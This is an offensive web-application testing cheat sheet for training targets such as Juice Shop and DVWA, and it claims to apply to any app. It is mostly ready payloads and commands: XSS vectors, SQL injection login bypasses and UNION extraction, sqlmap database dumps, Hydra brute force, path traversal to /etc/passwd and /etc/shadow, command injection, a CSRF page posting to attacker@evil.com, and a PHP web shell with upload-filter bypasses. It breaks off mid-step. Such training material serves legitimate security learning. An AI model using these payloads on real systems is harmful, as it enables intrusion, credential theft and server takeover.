# Web Application Challenge Solving Guide
### Vulnerability Types, Payloads, Tools, and Report Templates

> **How to use this document:** When you encounter a challenge or find a vulnerability, look it up by type. Each section tells you exactly what the vulnerability is, how to identify it, which tool to use, the exact payloads to try (in order), and a ready-to-fill report template.

> **Important:** These techniques apply universally across Juice Shop, Security Shepherd, DVWA, NanoCorp Bites, and any custom app. The payloads and process are the same — only the target URL changes.

---

## Table of Contents

1. [XSS — Cross-Site Scripting](#1-xss--cross-site-scripting)
   - 1.1 Reflected XSS
   - 1.2 DOM XSS
   - 1.3 Stored (Persistent) XSS
2. [SQL Injection](#2-sql-injection)
   - 2.1 Authentication Bypass
   - 2.2 UNION-Based Data Extraction
   - 2.3 Blind SQLi
   - 2.4 Automated SQLi with sqlmap
3. [Broken Authentication](#3-broken-authentication)
   - 3.1 Default / Weak Credentials
   - 3.2 Brute Force with Hydra
   - 3.3 Password Reset Abuse
4. [Broken Access Control / IDOR](#4-broken-access-control--idor)
   - 4.1 IDOR — Insecure Direct Object Reference
   - 4.2 Horizontal Privilege Escalation
   - 4.3 Vertical Privilege Escalation (Admin Access)
5. [Sensitive Data Exposure](#5-sensitive-data-exposure)
   - 5.1 Exposed Files and Backups
   - 5.2 Information in HTTP Headers
   - 5.3 Cleartext Credentials
6. [Security Misconfiguration](#6-security-misconfiguration)
   - 6.1 Missing Security Headers
   - 6.2 Directory Listing Enabled
   - 6.3 Exposed Admin Interfaces
7. [Path Traversal / Directory Traversal](#7-path-traversal--directory-traversal)
8. [Command Injection](#8-command-injection)
9. [CSRF — Cross-Site Request Forgery](#9-csrf--cross-site-request-forgery)
10. [File Upload Vulnerabilities](#10-file-upload-vulnerabilities)
11. [XXE — XML External Entity Injection](#11-xxe--xml-external-entity-injection)
12. [SSRF — Server-Side Request Forgery](#12-ssrf--server-side-request-forgery)
13. [Insecure Deserialization](#13-insecure-deserialization)
14. [Password Cracking (Offline)](#14-password-cracking-offline)
15. [Report Templates — Ready to Fill](#15-report-templates--ready-to-fill)

---

## How to Identify a Vulnerability (Universal First Steps)

Before diving into specific attacks, always do this for every input field or endpoint you find:

```
1. Try a single quote: '
   → SQL error in response? → SQL Injection possible

2. Try an angle bracket: <
   → Reflected in HTML without encoding? → XSS possible

3. Try a path separator: ../
   → Different response or file content? → Path Traversal possible

4. Change a numeric ID in a URL: ?id=1 → ?id=2
   → Different user's data appears? → IDOR

5. Remove your session cookie and retry a protected URL
   → Still accessible? → Broken Access Control

6. Check response headers with: curl -I http://TARGET:PORT
   → Missing X-Frame-Options, CSP, HSTS? → Security Misconfiguration
```

---

## 1. XSS — Cross-Site Scripting

### What It Is
XSS lets an attacker inject JavaScript into a web page that executes in another user's browser. It exploits the fact that the application reflects or stores user input without sanitising it.

### Where to Look
- Search bars
- Comment / review fields
- URL parameters that appear in the page
- Profile name / username fields
- Any form field whose value appears anywhere on the page after submission
- HTTP headers that get logged and displayed (e.g., User-Agent, Referer, X-Forwarded-For)

---

### 1.1 Reflected XSS

**What happens:** Your payload is in the URL or a form field, and it bounces straight back in the response page. Only affects the person who opens the crafted URL.

#### How to Find It
```bash
# Step 1: Put a unique string in every input and search for it in the response
curl -s "http://TARGET:PORT/search?q=TESTSTRING123" | grep "TESTSTRING123"
# If it appears unescaped in the HTML → XSS possible

# Step 2: Try the simplest XSS payload
curl -s "http://TARGET:PORT/search?q=<script>alert(1)</script>" | grep -i "script"
```

#### How to Exploit It — In Browser
```
1. Find a search bar or URL parameter that reflects your input
2. Type or paste this payload into the search/input field:
   <script>alert(1)</script>

3. If that is filtered, try these alternatives in order:
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   <iframe src="javascript:alert(`xss`)">
   <body onload=alert(1)>
   <input autofocus onfocus=alert(1)>
   <details open ontoggle=alert(1)>
   javascript:alert(1)

4. If angle brackets are filtered, try case variations:
   <ScRiPt>alert(1)</ScRiPt>
   <IMG SRC=x onerror=alert(1)>

5. If quotes are filtered, use backticks:
   <img src=x onerror=alert(`xss`)>
```

#### Juice Shop — Reflected XSS (Track Order)
```
Target URL:
http://TARGET:PORT/#/track-result?id=<iframe src="javascript:alert(`xss`)">

Steps:
1. Go to: http://TARGET:PORT/#/track-result
2. In the Order ID field, enter: <iframe src="javascript:alert(`xss`)">
3. Press Track — the alert fires immediately
4. Screenshot: show the full URL bar with payload + alert dialog
```

#### Using Burp Suite for Reflected XSS
```
1. Burp → Proxy → Intercept ON
2. Submit the form normally with any value
3. Intercept the request
4. In the parameter value, replace the value with: <script>alert(1)</script>
5. Forward the request
6. Check if the browser fires the alert
7. If not, Right-click → Send to Repeater
8. In Repeater, try each payload from the list above
9. Read the Response tab — look for your payload appearing unescaped
```

#### CVSS for Reflected XSS
```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Score:  6.1 — Medium
```

---

### 1.2 DOM XSS

**What happens:** The JavaScript on the page itself takes a value (usually from the URL hash or a parameter) and writes it directly into the DOM without sanitisation. The server never sees the payload — it runs entirely client-side.

#### How to Identify It
- URL contains `#` and the content after it appears on the page
- No network request is made when you change the hash value (check Burp — nothing in HTTP history)
- Browser DevTools → Sources shows `innerHTML`, `document.write`, `eval()` being called with URL data

#### How to Exploit It — Juice Shop DOM XSS (Search)
```
Target:
http://TARGET:PORT/#/search

Steps:
1. Open the Juice Shop search bar
2. Paste this payload directly into the search input:
   <iframe src="javascript:alert(`xss`)">
3. Press Enter — the alert fires immediately without a page reload
4. Screenshot the alert + search bar showing the payload

Why this works: The Angular app reads the search query and renders it
into the DOM via innerHTML without encoding it first.
```

#### Alternative DOM XSS Payloads
```javascript
<iframe src="javascript:alert(`xss`)">               // Challenge-specific (Juice Shop)
<img src=1 onerror=alert(document.domain)>           // Shows which domain it ran on
<svg><script>alert(1)</script></svg>                 // SVG-embedded script
<math><maction xlink:href="javascript:alert(1)">     // MathML vector
```

#### CVSS for DOM XSS
```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Score:  6.1 — Medium
```

---

### 1.3 Stored (Persistent) XSS

**What happens:** Your payload is saved to the database and executes every time ANY user views the affected page. Much more severe than Reflected XSS because it doesn't require tricking a user into clicking a link.

#### Where to Look
- Product reviews / comments
- Profile name / bio fields
- Feedback forms
- Any field that gets displayed to other users or in an admin panel

#### How to Exploit It — General
```
1. Find a field that stores data (comment, review, profile field)
2. Submit this payload as the value:
   <script>alert(document.cookie)</script>

3. Navigate to the page where this data is displayed
4. If the alert fires with a cookie value → Stored XSS confirmed

Alternative payloads:
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
```

#### Juice Shop — Stored XSS via Last Login IP Header
```
This is a header injection that gets stored and displayed to admin.

Steps:
1. Log in as admin (use SQLi bypass: admin@juice-sh.op'-- with any password)
2. Open Burp Suite → Intercept ON
3. Click Logout
4. Intercept the logout request
5. In Burp, add this header to the request:
   True-Client-IP: <iframe src="javascript:alert(`xss`)">
6. Forward the request
7. Log back in as admin
8. Navigate to: http://TARGET:PORT/#/privacy-security/last-login-ip
9. The XSS fires — the payload was stored and is now rendered on the page
10. Screenshot the alert + the Last Login IP page URL
```

#### Using Burp Repeater for Stored XSS Testing
```
1. Find a POST request that submits a comment/review (in Burp HTTP History)
2. Right-click → Send to Repeater
3. In the request body, find the text field parameter
4. Replace the value with: <script>alert(1)</script>
5. Click Send
6. Navigate to the page where comments are displayed
7. Check if the alert fires
```

#### CVSS for Stored XSS
```
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
Score:  6.4 — Medium (higher than Reflected because UI:N — no user click needed)
```

---

## 2. SQL Injection

### What It Is
SQL Injection occurs when user input is concatenated directly into a SQL query without parameterisation. An attacker can break out of the intended query and run their own SQL commands.

### Where to Look
- Login forms (username and password fields)
- Search bars
- URL parameters (`?id=1`, `?category=drinks`)
- Any field that retrieves or filters database content
- Sort/order parameters

### Quick Test for SQLi
```bash
# Test for error-based SQLi — put a single quote in any input:
'
# If you get a database error (SQLITE_ERROR, MySQL syntax error, ORA-xxx) → SQLi confirmed

# Test for boolean-based SQLi:
1 AND 1=1    # should return normal results
1 AND 1=2    # should return empty / different results
```

---

### 2.1 Authentication Bypass

**Goal:** Log in as any user (especially admin) without knowing the password.

#### How It Works
The login query usually looks like:
```sql
SELECT * FROM Users WHERE email='INPUT' AND password='INPUT'
```
By injecting `'--` after the email, the query becomes:
```sql
SELECT * FROM Users WHERE email='admin@juice-sh.op'--' AND password='anything'
```
The `--` comments out the password check entirely.

#### Payloads — Try These in the Email/Username Field
```
# Juice Shop / most apps — email field:
admin@juice-sh.op'--
' OR 1=1--
' OR '1'='1
' OR 1=1#
" OR "1"="1
admin'--
' OR 'x'='x
') OR ('1'='1

# Generic username field:
admin' --
admin'#
' OR 1=1 LIMIT 1--
anything' OR 'a'='a
```

#### Step-by-Step — Juice Shop Login Admin
```
Target: http://TARGET:PORT/#/login

Steps:
1. Open the login page in browser
2. In the Email field, enter exactly:
   ' OR 1=1--
3. In the Password field, enter anything:
   x
4. Click Log In
5. You are now logged in as the first user in the database (admin)

Alternative — target the admin account specifically:
   Email: admin@juice-sh.op'--
   Password: anything

6. After login, notice the top-right shows admin account
7. Screenshot: the page after login showing admin email in account menu
8. Check the scoreboard — "Login Admin" challenge turns green
```

#### Using Burp Repeater for SQLi Auth Bypass
```
1. Burp → Proxy → Intercept ON
2. Submit the login form with any credentials
3. Intercept the POST /rest/user/login request
4. Right-click → Send to Repeater
5. In the request body, find the email parameter
6. Change it to: ' OR 1=1--
7. Click Send
8. Response should contain a token → login successful
9. Copy the token from the response if needed for authenticated requests
```

---

### 2.2 UNION-Based Data Extraction

**Goal:** Extract data from the database (user table, passwords, emails) by appending a UNION SELECT to a query.

#### How It Works
Find a parameter vulnerable to SQLi, then build a UNION SELECT that matches the number of columns in the original query.

#### Step-by-Step — Juice Shop Product Search SQLi
```
Target: http://TARGET:PORT/rest/products/search?q=

Steps:
1. First, confirm SQLi exists:
   Search for: '
   → Should return a database error

2. Find the correct syntax (Juice Shop uses parentheses in its query):
   Search for: '))--
   → Should return ALL products (no filter applied)
   → This means the injection point uses '))

3. Find the number of columns (keep adding until no error):
   ')) UNION SELECT '1' FROM Users--           → error
   ')) UNION SELECT '1','2' FROM Users--       → error
   ')) UNION SELECT '1','2','3' FROM Users--   → error
   ...keep adding until success (Juice Shop needs 9 columns)

4. Extract emails and passwords:
   ')) UNION SELECT email,password,'3','4','5','6','7','8','9' FROM Users--

5. The search results will now show user emails and password hashes

How to run this in the browser:
   Go to the search bar and paste the payload
   OR use curl:
   curl "http://TARGET:PORT/rest/products/search?q='))%20UNION%20SELECT%20email,password,'3','4','5','6','7','8','9'%20FROM%20Users--"

6. Screenshot: the search results showing emails/hashes
```

#### Extract Database Structure (sqlite_master)
```sql
-- Find all table names in SQLite:
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--

-- Find all column names in a specific table:
')) UNION SELECT name,2,3,4,5,6,7,8,9 FROM pragma_table_info('Users')--
```

---

### 2.3 Blind SQLi

**What happens:** The application is vulnerable but doesn't show database errors or query results. You infer true/false from changes in the response (response length, response time, or content differences).

#### Boolean-Based Blind
```
# Add to a URL parameter:
?id=1 AND 1=1    → normal response (condition is TRUE)
?id=1 AND 1=2    → empty/different response (condition is FALSE)

# Extract data character by character:
?id=1 AND SUBSTRING(username,1,1)='a'    → TRUE if first char is 'a'
?id=1 AND SUBSTRING(username,1,1)='b'    → FALSE if it's not 'b'
```

#### Time-Based Blind
```sql
-- If response takes ~5 seconds, the database is vulnerable:
?id=1; SELECT SLEEP(5)--              -- MySQL
?id=1'; SELECT pg_sleep(5)--         -- PostgreSQL
?id=1'; WAITFOR DELAY '0:0:5'--      -- MSSQL
?id=1 AND 1=2 OR SLEEP(5)--          -- MySQL alternative
```

#### Automate Blind SQLi with sqlmap
```bash
# Basic blind SQLi test on a URL parameter
sqlmap -u "http://TARGET:PORT/page?id=1" --batch

# Test a specific parameter
sqlmap -u "http://TARGET:PORT/page?id=1&cat=2" -p id --batch

# Dump the entire database
sqlmap -u "http://TARGET:PORT/page?id=1" --dump --batch

# Test POST request (paste the raw request from Burp as a file)
sqlmap -r request.txt --batch

# Test with session cookie (for authenticated pages)
sqlmap -u "http://TARGET:PORT/page?id=1" \
  --cookie "session=YOUR_SESSION_TOKEN" --batch

# Dump a specific table
sqlmap -u "http://TARGET:PORT/page?id=1" -T Users --dump --batch
```

**How to save a request from Burp for sqlmap:**
```
1. In Burp HTTP History, right-click the request
2. Save Item → save as request.txt
3. Run: sqlmap -r request.txt --batch --dump
```

---

### 2.4 CVSS for SQL Injection
```
Auth bypass (pre-auth, full admin access):
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score:  9.8 — Critical

Data extraction (authenticated):
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Score:  6.5 — Medium
```

---

## 3. Broken Authentication

### What It Is
Authentication mechanisms that can be bypassed, brute-forced, or abused to gain access to accounts without valid credentials.

---

### 3.1 Default / Weak Credentials

**Always try these first** before any other technique:

```
admin / admin
admin / password
admin / 123456
admin / admin123
admin / Password1
admin / letmein
root / root
root / toor
guest / guest
test / test
user / user
administrator / administrator
```

#### Application-Specific Known Defaults
```
Juice Shop admin:    admin@juice-sh.op / admin123    (from OSINT — his YouTube video)
Juice Shop Jim:      jim@juice-sh.op / ncc-1701      (Star Trek reference, OSINT)
Juice Shop Bender:   bender@juice-sh.op              (needs SQLi bypass — strong password)
MC SafeSearch:       mc.safesearch@juice-sh.op / Mr. N00dles
DVWA:                admin / password
bWAPP:               bee / bug
Security Shepherd:   Your own registered account
```

---

### 3.2 Brute Force with Hydra

**When to use:** You have a known username but not the password, and the login form has no lockout.

#### HTTP POST Form (most web app login pages)
```bash
# First, capture the login request in Burp to know:
#   - The POST URL
#   - The parameter names (username/email/password)
#   - What the failed login response contains

# Basic brute force — username + wordlist for password
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid password"

# Email-based login
hydra -l admin@juice-sh.op -P /usr/share/dirb/wordlists/common.txt \
  TARGET -s PORT http-post-form \
  "/#/login:email=^USER^&password=^PASS^:Invalid"

# JSON login body (modern APIs)
hydra -l admin@juice-sh.op -P /usr/share/dirb/wordlists/common.txt \
  TARGET -s PORT http-post-form \
  '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:401'

# HTTP Basic Auth (username:password dialog box)
hydra -l admin -P /usr/share/dirb/wordlists/common.txt \
  TARGET -s PORT http-get /admin
```

**Hydra flag breakdown:**
- `-l` — single login/username to try
- `-L` — file of usernames to try
- `-p` — single password to try
- `-P` — file of passwords to try
- `-s PORT` — specify port if non-standard
- `http-post-form "URL:BODY:FAIL_STRING"` — the fail string is text in the response when login FAILS
- `http-get` — for Basic Auth or GET-based forms

#### Using Burp Intruder (GUI alternative to Hydra)
```
1. Intercept the login POST request in Burp
2. Right-click → Send to Intruder
3. Intruder tab → Positions
4. Click "Clear §" to remove all markers
5. Highlight the password value → click "Add §"
   Result: password=§value§
6. Go to Payloads tab
7. Payload type: Simple list
8. Load your wordlist or paste common passwords
9. Click Start Attack
10. Sort results by Status or Length — 200/302 with different length = success
```

---

### 3.3 Password Reset Abuse

**Common flaws in password reset flows:**

```
1. Predictable reset tokens (sequential numbers, timestamps)
2. Security questions with guessable answers
3. Reset link doesn't expire
4. Username enumeration via error messages ("email not found")

How to test:
1. Request a password reset for a known email
2. Intercept the reset request in Burp
3. Look at the token in the reset URL — is it random or predictable?
4. Try manipulating the token (change last digit, try sequential values)
5. Try the same reset link twice — does it still work?
```

#### Juice Shop — Bjoern's Password Reset (OSINT)
```
Steps:
1. Go to: http://TARGET:PORT/#/forgot-password
2. Enter email: bjoern@owasp.org
3. Security question: "What's your favorite dish?"
4. Answer: "Coconut Curry"  (found in his public social media / GitHub)
5. Set a new password
6. Challenge solved

Lesson: Security questions are effectively public information for anyone
with a social media presence. Never use them as the sole recovery mechanism.
```

---

## 4. Broken Access Control / IDOR

### What It Is
The application doesn't properly verify whether a logged-in user is authorised to access a specific resource. IDOR (Insecure Direct Object Reference) is a subtype where changing an ID in a URL or request grants access to another user's data.

### Where to Look
- URL parameters: `?id=1`, `?userId=5`, `?orderId=123`
- API endpoints: `/api/user/1`, `/api/orders/42`
- Body parameters in POST requests: `{"userId": 1}`
- File download parameters: `?file=report_user1.pdf`

---

### 4.1 IDOR — Insecure Direct Object Reference

#### How to Find It
```
1. Log in as any user
2. Note your user ID (check profile page, API responses, cookies)
3. Find any URL or parameter that contains a numeric ID
4. Change it to a different number

Examples:
  /api/user/5     →  try /api/user/1 (admin is usually ID 1)
  /api/user/5     →  try /api/user/4, 3, 2
  ?orderId=123    →  try orderId=122, 124
  ?basketId=5     →  try basketId=1, 2, 3
```

#### Juice Shop — Access Another User's Basket (IDOR)
```
Steps:
1. Log in as any user (register or use SQLi)
2. Add any item to your basket
3. Open Burp HTTP History
4. Find the request: GET /rest/basket/YOUR_BASKET_ID
   (your basket ID is in the URL — e.g., /rest/basket/5)
5. Right-click → Send to Repeater
6. Change the basket ID to 1, 2, 3 etc:
   GET /rest/basket/1
7. Click Send — if you see another user's basket contents → IDOR confirmed
8. Screenshot: Repeater showing /rest/basket/1 response with different user's data
```

#### Using curl for IDOR
```bash
# Get your basket
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://TARGET:PORT/rest/basket/5

# Try another user's basket
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://TARGET:PORT/rest/basket/1
```

#### CVSS for IDOR
```
Accessing another user's data (no auth required):
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Score:  6.5 — Medium

Modifying another user's data:
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
Score:  8.1 — High
```

---

### 4.2 Horizontal Privilege Escalation

**Definition:** Accessing another user's data at the same privilege level (user → another user's account, not user → admin).

```
Techniques:
1. IDOR on user IDs (covered above)
2. Manipulate JWT tokens (change userId claim)
3. Change cookies (if userId is stored in a cookie)
4. Tamper with hidden form fields

How to check JWT tokens:
1. After login, find the Authorization header or cookie containing a JWT
   (format: xxxxx.yyyyy.zzzzz — three base64 parts separated by dots)
2. Go to https://jwt.io or decode manually:
   echo "PAYLOAD_PART" | base64 -d
3. Look for userId, role, email fields
4. If the signature is not verified, you can change the payload
```

---

### 4.3 Vertical Privilege Escalation (Admin Access)

**Definition:** Gaining higher privileges than your account has (user → admin).

#### Juice Shop — Admin Registration
```
The registration API accepts a "role" field that the UI hides.
Sending it manually grants admin.

Steps:
1. Go to registration page: http://TARGET:PORT/#/register
2. Fill in details normally
3. Open Burp → Intercept the POST /api/Users/ registration request
4. Right-click → Send to Repeater
5. In the request body, add "role":"admin" to the JSON:
   {"email":"attacker@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"...","createdAt":"...","updatedAt":"..."},"securityAnswer":"test","role":"admin"}
6. Send — check the response
7. Log in with the new account — it should have admin privileges
8. Screenshot: admin panel accessible with the newly created account
```

#### Access Admin Panel Without Auth
```bash
# Simply try navigating to admin pages:
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/administration
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/admin
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/#/administration

# Juice Shop admin panel (requires admin login first):
http://TARGET:PORT/#/administration
```

---

## 5. Sensitive Data Exposure

### What It Is
The application unintentionally exposes sensitive data — credentials, PII, API keys, backup files — through misconfigured access controls, verbose errors, or insecure file handling.

---

### 5.1 Exposed Files and Backups

#### How to Find Them
```bash
# Check robots.txt first — developers sometimes list restricted paths
curl http://TARGET:PORT/robots.txt

# Common exposed file paths to check manually
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/backup.zip
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/.env
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/config.php
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/database.sql
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/phpinfo.php
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/.git/HEAD
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/ftp/
curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/logs/

# Run dirb with a focus on sensitive extensions
dirb http://TARGET:PORT /usr/share/dirb/wordlists/common.txt \
  -X .bak,.zip,.sql,.env,.conf,.config,.log,.old,.txt
```

#### Juice Shop — Exposed FTP Directory
```
Steps:
1. Navigate to: http://TARGET:PORT/ftp/
2. Directory listing is enabled — you can see all files
3. Download the files:
   curl -O http://TARGET:PORT/ftp/acquisitions.md
   curl -O http://TARGET:PORT/ftp/eastere.gg
4. Screenshot: the FTP directory listing in the browser
5. Challenge solved — "Confidential Document" challenge
```

#### Juice Shop — Access Backup File (Path Traversal bypass)
```
The /ftp directory only allows .md and .pdf files by extension check.
To download other files, use the Null Byte bypass:

Craft the URL:
http://TARGET:PORT/ftp/package.json.bak%2500.md

Explanation:
%25 = URL-encoded %
%2500 = %00 = null byte after URL decoding
The server sees package.json.bak (stops at null byte)
The extension check sees .md (after the null byte) → passes

Steps:
1. Try: http://TARGET:PORT/ftp/package.json.bak → 403 Forbidden
2. Try: http://TARGET:PORT/ftp/package.json.bak%2500.md → 200 OK
3. File downloads — screenshot the successful download
```

---

### 5.2 Information in HTTP Headers

```bash
# Check all response headers for version disclosure, server info
curl -I http://TARGET:PORT
curl -Iv https://TARGET:PORT 2>&1 | grep -E "Server:|X-Powered-By:|X-AspNet|Via:|X-Generator"

# What to look for:
# Server: Apache/2.2.8 (Ubuntu)   → Old version, known CVEs
# X-Powered-By: PHP/5.6.0         → Old PHP, known CVEs
# X-Powered-By: Express           → Node.js confirmed
# Missing headers are also findings:
# No X-Frame-Options               → Clickjacking possible
# No Content-Security-Policy       → XSS harder to mitigate
# No Strict-Transport-Security     → HTTPS downgrade possible
```

---

### 5.3 Cleartext Credentials

```bash
# Check if login sends credentials over HTTP (not HTTPS)
# In Burp, look at the login POST request
# Protocol column shows HTTP → credentials sent in cleartext → finding

# Check if credentials appear in URL (GET-based login)
# /login?username=admin&password=admin123 → critical finding

# Check page source for hardcoded credentials
curl http://TARGET:PORT | grep -iE "password|passwd|pwd|secret|api_key|token"
curl http://TARGET:PORT/main.js | grep -iE "password|secret|api_key|token"
```

---

## 6. Security Misconfiguration

### What It Is
The server or application is configured insecurely — missing headers, unnecessary features enabled, default settings not changed, verbose errors exposing internals.

### 6.1 Missing Security Headers

#### How to Check
```bash
# Quick header check
curl -I http://TARGET:PORT

# What should be present (if missing, it's a finding):
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Content-Security-Policy: default-src 'self'
# X-Frame-Options: DENY or SAMEORIGIN
# X-Content-Type-Options: nosniff
# Referrer-Policy: no-referrer
# Permissions-Policy: (various)

# nikto will also flag these automatically:
nikto -h http://TARGET:PORT
```

#### CVSS for Missing Headers
```
Missing X-Frame-Options (enables clickjacking):
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N
Score:  4.7 — Medium

Missing HSTS:
Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
Score:  5.3 — Medium
```

---

### 6.2 Directory Listing Enabled

```bash
# Test for directory listing
curl http://TARGET:PORT/ftp/       # shows files → listing enabled
curl http://TARGET:PORT/images/    # shows image files → listing enabled
curl http://TARGET:PORT/uploads/   # very sensitive if listing enabled

# In browser: navigate to a directory path
# If you see "Index of /path" → directory listing enabled
```

---

### 6.3 Exposed Admin Interfaces

```bash
# Try common admin paths
for path in admin administrator manage management console dashboard panel control; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET:PORT/$path)
  echo "$code — /$path"
done

# Juice Shop admin panel (requires admin login):
http://TARGET:PORT/#/administration
```

---

## 7. Path Traversal / Directory Traversal

### What It Is
The application uses user-controlled input to build a file path on the server. By inserting `../` sequences, an attacker can escape the intended directory and read arbitrary files.

### Where to Look
- URL parameters: `?file=report.pdf`, `?page=home`, `?template=main`
- File download endpoints
- Image/media loading parameters
- Log viewer functionality

### Payloads — Try in Order
```
# Basic traversal (Linux target):
../../../etc/passwd
../../../../etc/passwd

# URL-encoded (if the app URL-decodes before checking):
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double URL-encoded:
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (to bypass extension checks):
../../../etc/passwd%00.jpg
../../../etc/passwd%2500.pdf

# Windows target:
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini

# Interesting Linux files to target:
../../../etc/passwd          → user accounts
../../../etc/shadow          → password hashes (needs root)
../../../etc/hosts           → internal hostnames
../../../proc/self/environ   → environment variables (may contain secrets)
../../../var/log/apache2/access.log  → web logs
```

### How to Test
```bash
# Direct URL manipulation:
curl "http://TARGET:PORT/download?file=../../../etc/passwd"
curl "http://TARGET:PORT/static?page=../../../etc/passwd"

# URL-encoded:
curl "http://TARGET:PORT/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# In Burp Repeater:
# Find any request with a filename parameter
# Change the value to: ../../../etc/passwd
# Try progressively more ../ sequences until you get the file
```

### CVSS for Path Traversal
```
Reading /etc/passwd (low severity data):
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score:  7.5 — High

Reading config files with credentials:
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score:  7.5 — High
```

---

## 8. Command Injection

### What It Is
The application passes user input to a system command (shell). By injecting shell metacharacters, an attacker can run arbitrary OS commands on the server.

### Where to Look
- Ping/traceroute tools in the application
- DNS lookup features
- File conversion utilities
- Any feature that "runs" something based on your input

### Payloads
```bash
# Command separators — try each one:
; id
| id
|| id
& id
&& id
`id`
$(id)
; whoami
; cat /etc/passwd

# Examples inserted into an IP address field:
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1`id`

# If output is not shown (blind command injection), use time delay:
127.0.0.1; sleep 5
127.0.0.1 | sleep 5

# Or write to a file and retrieve it:
127.0.0.1; id > /var/www/html/output.txt
# Then visit: http://TARGET/output.txt

# DVWA Command Injection (Low security):
# Enter in the IP field:
127.0.0.1; cat /etc/passwd
127.0.0.1 && ls -la /
```

### How to Test in Burp
```
1. Find a form that submits a system command trigger (e.g., ping)
2. Intercept the request in Burp
3. Send to Repeater
4. Add ; id after the input value in the body
5. Click Send and look for uid= in the response
6. If found → Remote Code Execution via Command Injection
```

### CVSS for Command Injection
```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score:  9.8 — Critical
```

---

## 9. CSRF — Cross-Site Request Forgery

### What It Is
A CSRF attack tricks a logged-in user's browser into making an unintended request to the application (e.g., changing their email, transferring money) without their knowledge.

### How to Identify It
```
1. Find a state-changing action (change email, change password, delete account)
2. Intercept the request in Burp
3. Look for a CSRF token in the request:
   - If NO token → likely vulnerable
   - If token present → test if it's validated server-side
4. Check if the request uses SameSite cookie attribute
5. Check if the server validates the Origin or Referer header
```

### How to Test
```
1. Log in as the victim user
2. Intercept a state-changing POST request in Burp
3. Right-click → Engagement Tools → Generate CSRF PoC
4. Burp generates an HTML page with a form that auto-submits
5. Copy the HTML, serve it from a different origin
6. Open it in another browser tab where you're logged in
7. If the action executes → CSRF confirmed
```

### Manual CSRF PoC
```html
<!-- Save as csrf_test.html and open in browser while logged in -->
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://TARGET:PORT/api/Users/changeEmail">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="currentPassword" value="">
    </form>
  </body>
</html>
```

### CVSS for CSRF
```
Changing email/password (account takeover potential):
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
Score:  6.5 — Medium
```

---

## 10. File Upload Vulnerabilities

### What It Is
The application allows file uploads without properly validating the file type or content. An attacker can upload a malicious file (web shell) and execute it on the server.

### Where to Look
- Profile picture uploads
- Document upload functionality
- Import/export features
- Any form with a file input field

### Bypass Techniques — Try in Order
```
# 1. Try a basic PHP web shell as .php:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload shell.php directly → if accepted, browse to uploaded file

# 2. Change extension to allowed types:
shell.php → shell.php.jpg     # double extension
shell.php → shell.pHp         # case variation
shell.php → shell.php3        # alternative PHP extension
shell.php → shell.phtml
shell.php → shell.shtml

# 3. Change Content-Type in Burp:
# Intercept the upload request
# Change Content-Type from application/octet-stream to image/jpeg
# Keep the PHP content — some servers only check Content-Type

# 4. Magic bytes bypass:
# Prepend JPEG magic bytes to the PHP file:
printf '\xff\xd8\xff\xe0' > shell_magic.php
echo '<?php system($_GET["cmd"]); ?>' >> shell_magic.php
# Server checks magic bytes (thinks it's JPEG), executes as PHP

# 5. Null byte bypass (older servers):
shell.php%00.jpg
```

### Juice Shop — File Upload Challenge
```
The file upload only allows .pdf and .zip files (client-side check).
The server checks file size but not type strictly.

Steps:
1. Go to the Complaint page: http://TARGET:PORT/#/complain
2. Try uploading a .pdf file larger than 100KB but less than 200KB:
   dd if=/dev/urandom bs=1024 count=150 | base64 > large_file.pdf
   
